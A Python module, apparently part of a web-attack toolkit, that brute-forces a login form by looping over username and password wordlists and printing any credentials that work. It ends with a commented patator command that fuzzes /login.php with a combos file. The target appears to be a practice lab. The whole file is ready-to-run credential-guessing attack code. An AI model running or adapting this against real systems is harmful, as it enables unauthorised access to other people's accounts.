import configparser
from attacks.password_attacks import login_brute
success_msg = 'Welcome to the password protected area'

config = configparser.ConfigParser()
config.read('config.ini')


def attack(session, users, passw):
    # Credentials for password attacks (from config file)
    dict_user = config['dictionaries']['users'].split('\n')
    dict_pass = config['dictionaries']['passwords'].split('\n')

    usernames = []
    passwords = []
    credentials = []

    # If users were given on command line, they have priority over the config file
    if not users:
        for file in dict_user:
            usernames.extend(open(file, "r", errors='replace').readlines())
    else:
        usernames.extend(users)

    # If passwords were given on command line, they have priority over the config file
    if not passw:
        for file in dict_pass:
            passwords.extend(open(file, "r", errors='replace').readlines())
    else:
        passwords.extend(passw)

    # Dictionary attack loop
    for u in usernames:
        u = u.rstrip('\n')
        for p in passwords:
            p = p.rstrip('\n')
            print("Trying with: Username: {} Password: {}".format(u, p))

            response = login_brute.login_brute(session, u, p)
            if success_msg in response.text:
                credentials.append({'username': u, 'password': p})
                print("\tCredentials found!\n\tUsername: {}\n\tPassword: {}\n".format(u, p))
                break

    print("Dictionary attack finished!\nThe following credentials have been found:")
    for c in credentials:
        print("\tUsername: {0:<10}\tPassword: {1:<10}".format(c["username"], c["password"]))

#patator http_fuzz url=$url/login.php method=POST body='username=COMBO00&password=COMBO01&Login=Login&user_token=ab277e16a3d331b31e95e637fb3a5ab3' 0=combos.txt before_urls=$url/login.php accept_cookie=1 follow=1 -x ignore:fgrep='Login Failed' -l $PWD/patator_out